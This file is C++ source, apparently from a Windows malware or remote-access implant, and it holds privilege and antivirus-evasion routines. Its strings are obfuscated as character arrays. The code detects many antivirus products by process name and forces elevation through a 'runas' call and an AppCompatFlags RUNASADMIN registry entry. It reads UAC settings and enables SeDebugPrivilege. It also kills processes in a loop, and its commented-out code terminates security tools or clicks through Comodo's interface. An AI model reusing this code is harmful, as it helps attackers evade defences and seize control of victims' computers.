#include <Windows.h>
#include "PublicVar.h"
#include "AntiVirusInfo.h"


#include <lm.h>
#pragma comment( lib, "netapi32.lib" )


//DWORD NetQueryDisplayInformation( IN LPCWSTR ServerName OPTIONAL, IN DWORD Level, IN DWORD Index, IN DWORD EntriesRequested, IN DWORD PreferredMaximumLength, OUT LPDWORD ReturnedEntryCount, OUT PVOID *SortedBuffer );
BOOL IsUserAdminGroup()
{
	
	DWORD rc;
	wchar_t user_name[MAX_PATH];
	USER_INFO_1 *info;
	DWORD size = MAX_PATH;

	GetUserNameW( user_name, &size);

	rc = NetUserGetInfo( NULL, user_name, 1, (byte **) &info );
	if ( rc != NERR_Success )
		return false;

	BOOL result = info->usri1_priv == USER_PRIV_ADMIN;

	NetApiBufferFree( info );
	return result;
}






int GainAdminPrivileges(char * strApp,UINT idd)
{  
	char         strCmd[MAX_PATH];  
	char szAdminOptFormat[] = {'/','a','d','m','i','n','o','p','t','i','o','n',' ','%','d',0};	//	"/adminoption %d"
	lpwsprintfA(strCmd,szAdminOptFormat,idd);
	char szRunAs[] = {'r','u','n','a','s',0};

	SHELLEXECUTEINFOA execinfo;  
	memset(&execinfo, 0, sizeof(execinfo));  
	execinfo.lpFile         = strApp;  
	execinfo.cbSize         = sizeof(execinfo);  
	execinfo.lpVerb         = szRunAs;  
	execinfo.fMask          = SEE_MASK_NO_CONSOLE;  
	execinfo.nShow          = SW_SHOWDEFAULT;  
	execinfo.lpParameters   = strCmd;  

	int iRet = lpShellExecuteExA(&execinfo);  
	return iRet;
} 



//equal set jobadd
int SetRunAsAdmin()
{
	unsigned char szQueryValue[MAX_PATH];
	unsigned long iQueryLen = MAX_PATH;
	unsigned long iType = 0; 
	DWORD dwDisPos = 0;
	HKEY hKey = 0;
	int iRes = 0;

	//'Software\Microsoft\Windows\CurrentVersion\RunServicesOnce',0
	//'Software\Microsoft\Windows\CurrentVersion\RunServices',0
	//'Software\Microsoft\Windows\CurrentVersion\RunOnce',0

	char szRunAsAdmin[] = {'R','U','N','A','S','A','D','M','I','N',0};
	//not "\\Software\\Microsoft\\Windows NT\\CurrentVersion\\AppCompatFlags\\Layers\\"
	char szSubkeyRunAs[MAX_PATH] = {'S','o','f','t','w','a','r','e','\\','M','i','c','r','o','s','o','f','t','\\','W','i','n','d','o','w','s',' ','N','T','\\',\
		'C','u','r','r','e','n','t','V','e','r','s','i','o','n','\\','A','p','p','C','o','m','p','a','t','F','l','a','g','s','\\','L','a','y','e','r','s',0};


	iRes = lpRegCreateKeyExA(HKEY_CURRENT_USER,szSubkeyRunAs,0,REG_NONE,REG_OPTION_NON_VOLATILE,KEY_READ|KEY_WRITE,0,&hKey,&dwDisPos);
	if(iRes != ERROR_SUCCESS)
	{
		//char szError[1024];
		//FormatMessageA(FORMAT_MESSAGE_FROM_SYSTEM,szError,iRes,0,szError,MAX_PATH,0);
		WriteLittleBearLog("SetRunAsAdmin lpRegCreateKeyExA error\r\n");
		return FALSE;
	}

	iRes = lpRegQueryValueExA(hKey,strPEResidence,0,&iType,szQueryValue,&iQueryLen);
	if(iRes == ERROR_SUCCESS)
	{
		if (lpRtlCompareMemory((char*)szQueryValue,szRunAsAdmin,lplstrlenA(szRunAsAdmin)) == lplstrlenA(szRunAsAdmin))
		{
			lpRegCloseKey(hKey);
			WriteLittleBearLog("SetRunAsAdmin lpRegQueryValueExA ok,the key was existing\r\n");
			return TRUE;
		}
		else
		{
			WriteLittleBearLog("SetRunAsAdmin lpRegQueryValueExA value is not runasadmin\r\n");
			lpRegCloseKey(hKey);
			return FALSE;
		}

		return TRUE;
	}
	else
	{
		iRes = lpRegSetValueExA(hKey,strPEResidence,0,REG_SZ,(unsigned char*)szRunAsAdmin,lplstrlenA(szRunAsAdmin));
		if (iRes != ERROR_SUCCESS)
		{
			WriteLittleBearLog("SetRunAsAdmin lpRegSetValueExA error\r\n");
			lpRegCloseKey(hKey);
			return FALSE;
		}
		else
		{
			//RegFlushKey(hKey);
			WriteLittleBearLog("SetRunAsAdmin lpRegSetValueExA ok\r\n");
			lpRegCloseKey(hKey);
			return TRUE;
			//u can move it into setup folder
		}
	}
	
	return FALSE;
}



int IsUACEnable(int iCpuBits,int * iEnableLUA,int * iConsentPromptBehaviorAdmin,int * iPromptOnSecureDesktop)
{
	//"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\\"
	char szUacSubKey[] = {'S','O','F','T','W','A','R','E','\\','M','i','c','r','o','s','o','f','t','\\','W','i','n','d','o','w','s',
		'\\','C','u','r','r','e','n','t','V','e','r','s','i','o','n','\\','P','o','l','i','c','i','e','s','\\','S','y','s','t','e','m','\\',0};

	//"PromptOnSecureDesktop"
	char szPromptOnSecureDesktop[] = {'P','r','o','m','p','t','O','n','S','e','c','u','r','e','D','e','s','k','t','o','p',0};
	//"ConsentPromptBehaviorAdmin"
	char szConsentPromptBehaviorAdmin[] = {'C','o','n','s','e','n','t','P','r','o','m','p','t','B','e','h','a','v','i','o','r','A','d','m','i','n',0};
	//"EnableLUA"
	char szEnableLUA[] = {'E','n','a','b','l','e','L','U','A',0};

	// window vista or windows server 2008 or later operating system
	if (iSystemVersion >= SYSTEM_VERSION_VISTA)
	{
		PVOID dwWow64Value;
		if (iCpuBits == 64 )
		{
			pfnWow64DisableWow64FsRedirection(&dwWow64Value); 
		}

		HKEY hKEY = NULL;
		DWORD dwType = REG_DWORD;
		DWORD dwSize = sizeof(DWORD);
		LONG status = lpRegOpenKeyExA(HKEY_LOCAL_MACHINE,szUacSubKey,0,KEY_READ,&hKEY);
		if (iCpuBits == 64 )
		{
			pfnWow64DisableWow64FsRedirection(&dwWow64Value); 
		}
		if ( ERROR_SUCCESS == status )
		{
			status = lpRegQueryValueExA(hKEY,szPromptOnSecureDesktop,NULL,&dwType,(BYTE*)iPromptOnSecureDesktop,&dwSize);
			if (ERROR_SUCCESS == status)
			{
				status = lpRegQueryValueExA(hKEY,szConsentPromptBehaviorAdmin,NULL,&dwType,(BYTE*)iConsentPromptBehaviorAdmin,&dwSize);
				if (ERROR_SUCCESS == status)
				{
					
				}
				else
				{
					lpRegCloseKey(hKEY);
					WriteLittleBearLog("IsUACEnable lpRegQueryValueExA error\r\n" );
					return FALSE;
				}
			}
			else
			{
				lpRegCloseKey(hKEY);
				WriteLittleBearLog("IsUACEnable lpRegQueryValueExA error\r\n" );
				return FALSE;
			}

			status = lpRegQueryValueExA(hKEY,szEnableLUA,NULL,&dwType,(BYTE*)iEnableLUA,&dwSize);
			if (ERROR_SUCCESS == status)
			{
				
			}
			else
			{
				WriteLittleBearLog("IsUACEnable lpRegQueryValueExA error\r\n" );
				lpRegCloseKey(hKEY);
				return FALSE;
			}
#ifdef _DEBUG

			char szShowBuf[1024];
			lpwsprintfA(szShowBuf,"EnableLUA:%u,ConsentPromptBehaviorAdmin:%u,PromptOnSecureDesktop:%u\r\n",
				*iEnableLUA,*iConsentPromptBehaviorAdmin,*iPromptOnSecureDesktop);
			WriteLittleBearLog(szShowBuf);
#endif

			lpRegCloseKey(hKEY);
			return (*iConsentPromptBehaviorAdmin) | (*iPromptOnSecureDesktop);
		}
	}

	return FALSE;
}




BOOL IsAdministratorUser(HMODULE lpDllShell32)
{
	char szIsUserAnAdmain[] = {'I','s','U','s','e','r','A','n','A','d','m','i','n',0};
	typedef BOOL (__stdcall *FunctionIsUserAdmin)();
	FunctionIsUserAdmin pfnIsUserAnAdmin = (FunctionIsUserAdmin)lpGetProcAddress(lpDllShell32,szIsUserAnAdmain);
	if (pfnIsUserAnAdmin)
	{
		int iRet = pfnIsUserAnAdmin();
		return iRet;
	}
	return FALSE;
}




//http://www.1sohu.com/newsHtm/26/n_51826.shtml#ixzz4ZbmBEqNe
BOOL IsProcessAdmin()  
{  
	HANDLE                   hAccessToken;  
	BYTE                     InfoBuffer[1024];     
	PTOKEN_GROUPS            ptgGroups;  
	DWORD                    dwInfoBufferSize;  
	PSID                     psidAdministrators;  
	SID_IDENTIFIER_AUTHORITY siaNtAuthority = SECURITY_NT_AUTHORITY;  
	UINT                     i;  
	BOOL                     bRet = FALSE;  

	if(!lpOpenProcessToken(lpGetCurrentProcess(),TOKEN_QUERY,&hAccessToken)) 
	{
		return bRet;           
	}
	bRet = lpGetTokenInformation(hAccessToken, TokenGroups, InfoBuffer, 1024, &dwInfoBufferSize); 
	lpCloseHandle(hAccessToken);  
	if(!bRet)  
	{
		return bRet; 
	}
	if(!lpAllocateAndInitializeSid(&siaNtAuthority,  2,  SECURITY_BUILTIN_DOMAIN_RID,  DOMAIN_ALIAS_RID_ADMINS,  0,0,0,0,0,0,  &psidAdministrators))
	{
		return FALSE;   
	}
	bRet = FALSE;     
	ptgGroups = (PTOKEN_GROUPS)InfoBuffer;  
	for(i=0;i<ptgGroups->GroupCount;i++) 
	{
		if(lpEqualSid(psidAdministrators,ptgGroups->Groups[i].Sid))  
		{
			bRet = TRUE;  
		}
	}
	lpFreeSid(psidAdministrators);   
	return bRet;
}





// BOOL IsProcessAdmin( )
// {
// 	BOOL bElevated = FALSE;  
// 	HANDLE hToken = NULL;  
// 
// 	//CString strTip;
// 
// 	// Get target process token
// 	HANDLE hProcess = lpGetCurrentProcess();
// 	if ( !lpOpenProcessToken(hProcess , TOKEN_QUERY, &hToken ) )
// 	{
// 		//strTip.Format( _T("OpenProcessToken failed, GetLastError: %d"), GetLastError() );
// 		//AfxMessageBox( strTip );
// 		return FALSE;
// 	}
// 
// 	TOKEN_ELEVATION tokenEle;
// 	DWORD dwRetLen = 0;  
// 
// 	// Retrieve token elevation information
// 	if ( lpGetTokenInformation( hToken, TokenElevation, &tokenEle, sizeof(tokenEle), &dwRetLen ) )
// 	{  
// 		if ( dwRetLen == sizeof(tokenEle) )
// 		{
// 			bElevated = tokenEle.TokenIsElevated;  
// 		}
// 	}  
// 	else
// 	{
// 		//strTip.Format( _T("GetTokenInformation failed, GetLastError: %d"), GetLastError() );
// 		//AfxMessageBox( strTip );
// 	}
// 
// 	lpCloseHandle( hToken );  
// 	return bElevated;  
// }







//char szQQProtect[] = { 'q','q','p','r','o','t','e','c','t','.','e','x','e',0 };
int CloseProcByName(char * pname)
{
	while (TRUE)
	{
		DWORD dwProcID = GetProcessIdByName(pname);
		if (dwProcID)
		{
			HANDLE hProc = lpOpenProcess(PROCESS_ALL_ACCESS, 0, dwProcID);
			if (hProc)
			{
				int iRet = lpTerminateProcess(hProc, 0);
				lpCloseHandle(hProc);
			}
		}
		lpSleep(3000);
	}
	return FALSE;
}

int CloseProcessByName(char * procname) {
	char szcmd[MAX_PATH];
	char szcmdformat[] = { 'c','m','d',' ','/','c',' ','T','A','S','K','K','I','L','L',' ','/','F',' ','/','I','M',' ','%','s',0 };
	lpwsprintfA(szcmd, szcmdformat, procname);
	int ret = lpWinExec(szcmd, SW_HIDE);
	if (ret > 32)
	{
		lpSleep(3000);
		return TRUE;
	}
	return FALSE;
}


DWORD FindPidByName(char * szProcessName)
{
	DWORD aProcId[4096] = { 0 };
	DWORD dwProcCnt = 0;

	HMODULE hMod = 0;
	DWORD dwModCnt = 0;

	char lpProcessName[MAX_PATH] = { 0 };
	lplstrcpyA(lpProcessName, szProcessName);
	_strupr_s(lpProcessName, MAX_PATH);

	char szPath[MAX_PATH] = { 0 };

	int iRet = lpEnumProcesses(aProcId, sizeof(aProcId), &dwProcCnt);
	if (iRet == 0)
	{
		return FALSE;
	}

	for (DWORD i = 0; i < dwProcCnt; ++i)
	{
		HANDLE hProc = lpOpenProcess(PROCESS_ALL_ACCESS, FALSE, aProcId[i]);
		if (NULL != hProc)
		{
			iRet = lpEnumProcessModules(hProc, &hMod, sizeof(hMod), &dwModCnt);
			if (iRet)
			{
				iRet = lpGetModuleBaseNameA(hProc, hMod, szPath, MAX_PATH);
				_strupr_s(szPath, MAX_PATH);
				if (lpRtlCompareMemory(szPath, lpProcessName, lplstrlenA(lpProcessName)) == lplstrlenA(lpProcessName))
				{
					lpCloseHandle(hProc);
					return aProcId[i];
				}
			}
			lpCloseHandle(hProc);
		}
	}
	return FALSE;
}



DWORD GetProcessIdByName(char * szProcessName)
{
	char szProcName[MAX_PATH] = { 0 };
	lplstrcpyA(szProcName, szProcessName);
	_strupr_s(szProcName, MAX_PATH);

	PROCESSENTRY32 pe32 = { 0 };
	pe32.dwSize = sizeof(pe32);
	HANDLE hProcessSnap = lpCreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	if (hProcessSnap == INVALID_HANDLE_VALUE)
	{
		return FALSE;
	}

	int iRet = 0;
	BOOL bNext = lpProcess32First(hProcessSnap, &pe32);
	while (bNext)
	{
		char szexefn[MAX_PATH] = { 0 };
		int ret = WStringToMString(pe32.szExeFile, lstrlenW(pe32.szExeFile), szexefn, MAX_PATH);
		_strupr_s(szexefn, MAX_PATH);

		if (lplstrcmpA(szProcName, szexefn) == 0)
		{
			lpCloseHandle(hProcessSnap);
			return pe32.th32ProcessID;
		}
		bNext = lpProcess32Next(hProcessSnap, &pe32);
	}
	lpCloseHandle(hProcessSnap);
	return FALSE;
}




/*
//178 217
// 134 232
// 189  287 
// #define COMODO_ANTIVIRUS_WIDTH			178
// #define COMODO_ANTIVIRUS_HEIGHT			217
//#define COMODO_ANTIVIRUS_FOLDER_HEIGHT	92
//the right click menu size is irrelevent with screen resolution
#define COMODO_CONTROL_CONSOLE_RIGHTBUTTON_MENU_HEIGHT	232
#define COMODO_CONTROL_CONSOLE_RIGHTBUTTON_MENU_WIDTH	136
int MouseEventToCloseComodo()
{
	HWND hwndComodo = lpFindWindowA("CisWidget","COMODO Internet Security Premium");
	RECT stRect = {0};
	if (hwndComodo)
	{
		int iRet = lpGetWindowRect(hwndComodo,&stRect);
		if (iRet == 0)
		{
			return FALSE;
		}

		int iIsFolder = 0;
		if (stRect.bottom - stRect.top < stRect.right - stRect.left)
		{
			iIsFolder = TRUE;
		}
		else
		{
			iIsFolder = FALSE;
		}
// 		int iComodoConsoleWidth = stRect.right - stRect.left;
// 		int iComodoConsoleHeight = stRect.bottom - stRect.top;

		char szScreenDCName[] = {'D','I','S','P','L','A','Y',0};
		HDC hdc = lpCreateDCA(szScreenDCName, NULL, NULL, NULL);
		int xScrn = lpGetDeviceCaps(hdc, HORZRES);
		int yScrn = lpGetDeviceCaps(hdc, VERTRES);
		lpDeleteDC(hdc);

		POINT stPtMid = {0};
		stPtMid.x = (stRect.left + stRect.right) >> 1;
		stPtMid.y = (stRect.bottom + stRect.top) >> 1;
		
		POINT stPtRightButtonClickMenu = {0};
		if (stPtMid.y < COMODO_CONTROL_CONSOLE_RIGHTBUTTON_MENU_HEIGHT)
		{
			stPtRightButtonClickMenu.y = COMODO_CONTROL_CONSOLE_RIGHTBUTTON_MENU_HEIGHT;
		}
		else
		{
			stPtRightButtonClickMenu.y = stPtMid.y;
		}

		if (stPtMid.x > xScrn - COMODO_CONTROL_CONSOLE_RIGHTBUTTON_MENU_WIDTH)
		{
			stPtRightButtonClickMenu.x = xScrn - COMODO_CONTROL_CONSOLE_RIGHTBUTTON_MENU_WIDTH;
		}
		else
		{
			stPtRightButtonClickMenu.x = stPtMid.x;
		}

		iRet = SetCursorPos(stPtMid.x ,stPtMid.y);
		mouse_event(MOUSEEVENTF_RIGHTDOWN,0,0,0,0);
		mouse_event(MOUSEEVENTF_RIGHTUP,0,0,0,0);
		lpSleep(500);

// 		POINT stPtFirLeftClick = {0};
// 		stPtFirLeftClick.x = (stRect.left + stRect.right) >>1;
// 		stPtFirLeftClick.y = (stRect.bottom + 10);
// 		if (iIsFolder)
// 		{
// 			stPtFirLeftClick.y = stPtFirLeftClick.y + COMODO_ANTIVIRUS_HEIGHT - COMODO_ANTIVIRUS_FOLDER_HEIGHT;
// 		}
//		iRet = SetCursorPos(stPtFirLeftClick.x, stPtFirLeftClick.y);

		iRet = SetCursorPos(stPtRightButtonClickMenu.x + 30, stPtRightButtonClickMenu.y - 10);	//left bottom postion of right click menu
		mouse_event(MOUSEEVENTF_LEFTDOWN,0,0,0,0);
		mouse_event(MOUSEEVENTF_LEFTUP,0,0,0,0);

		lpSleep(500);
		iRet = SetCursorPos(745, 455);
		mouse_event(MOUSEEVENTF_LEFTDOWN,0,0,0,0);
		mouse_event(MOUSEEVENTF_LEFTUP,0,0,0,0);
		return TRUE;
	}
	
	return FALSE;
}
*/



int GetAntivirusSoftInfo()
{
	char sz360Tray[] = {'3','6','0','T','r','a','y','.','e','x','e',0};
	char szAvguard[] = {'A','V','G','U','A','R','D','.','E','X','E',0};
	char szAvgnt[]  =  {'A','V','G','N','T','.','E','X','E',0};
	CHAR szAvcenter[] = {'A','V','C','E','N','T','E','R','.','E','X','E',0};
	char szQQ[] = {'Q','Q','.','E','X','E',0};

	char sz360SecurityDefender[] = {'3','6','0','s','d','.','e','x','e',0};
	char sz360RealtimeProtect[] = {'3','6','0','r','p','.','e','x','e',0};

	//char sz360RealtimeProtectService[] = {'3','6','0','r','p','s','.','e','x','e',0};
	//get all the process on the computer,include client user and admin user
	b360Running = GetProcessIdByName(sz360Tray) /*| GetProcessIdByName(sz360SecurityDefender) | GetProcessIdByName(sz360RealtimeProtect)*/;

	bQQExist = GetProcessIdByName(szQQ);

	bAvgntRunning = GetProcessIdByName(szAvgnt) |  GetProcessIdByName(szAvguard) |  GetProcessIdByName(szAvcenter);

	bAvastRunning = GetProcessIdByName("avastui.exe") | GetProcessIdByName("aswidsagent.exe") ;

	char szCistray[] = {'c','i','s','t','r','a','y','.','e','x','e',0};
	bComodoRunning = GetProcessIdByName(szCistray);
// 	if (bComodoExist)
// 	{
// 		lpGetSystemDirectoryA(szSysDir,MAX_PATH);
// 		//int iRet = MouseEventToCloseComodo();
// 		char szNtsdShutdown[MAX_PATH];
// 		lpwsprintfA(szNtsdShutdown,"ntsd -c q -p %u",bComodoExist);
// 		lpWinExec(szNtsdShutdown,SW_HIDE);	
// 		lpwsprintfA(szNtsdShutdown,"TASKKILL /IM %s /F",szCistray);
// 		lpWinExec(szNtsdShutdown,SW_HIDE);
// 		//lpExitProcess(0);
// 	}

	//ruixing rsmain.exe rsagent.exe
	bRuixingRunning = GetProcessIdByName("rsmain.exe") | GetProcessIdByName("rsagent.exe");

	bJinshanRunning = GetProcessIdByName("KSafeTray.exe") | GetProcessIdByName("kxetray.exe");

	bNortonRunning = GetProcessIdByName("NS.exe");

	bKasperskyRunning = GetProcessIdByName("avpui.exe") | GetProcessIdByName("avp.exe");

	bBaiduAntiRunning = GetProcessIdByName("BaiduAnSvc.exe") | GetProcessIdByName("BaidusdSvc.exe");

 	bQQPCTrayRunning = GetProcessIdByName("QQPCTray.exe");
// 	if (bQQPCTrayExist)
// 	{
// 		char szNtsdShutdown[MAX_PATH];
// 		lpwsprintfA(szNtsdShutdown,"ntsd -c q -p %u",bQQPCTrayExist);
// 		lpWinExec(szNtsdShutdown,SW_HIDE);
// 		lpwsprintfA(szNtsdShutdown,"TASKKILL /IM QQPCTray.exe /F");
// 		lpWinExec(szNtsdShutdown,SW_HIDE);
// 	}

	return TRUE;
}



int EnableDebugPrivilege(HANDLE hProc,BOOL bFlag)   
{   
	HANDLE hToken;   
	LUID sedebugnameValue;   
	TOKEN_PRIVILEGES tkp;   
	if (!lpOpenProcessToken(hProc, TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken))
	{   
		return   FALSE;   
	}   
	if (!lpLookupPrivilegeValueW(NULL, SE_DEBUG_NAME, &sedebugnameValue))  
	{   
		lpCloseHandle(hToken);   
		return FALSE;   
	}   
	tkp.PrivilegeCount = 1;   
	tkp.Privileges[0].Luid = sedebugnameValue;   
	if (bFlag)
	{
		tkp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;   
	}
	else
	{
		tkp.Privileges[0].Attributes = 0;   
	}
	
	if (!lpAdjustTokenPrivileges(hToken, FALSE, &tkp, sizeof(tkp), NULL, NULL)) 
	{   
		lpCloseHandle(hToken);   
		return FALSE;   
	}   

	lpCloseHandle(hToken);  
	if(lpRtlGetLastWin32Error() == ERROR_NOT_ALL_ASSIGNED)
	{
		return FALSE;
	}
	return TRUE;   
}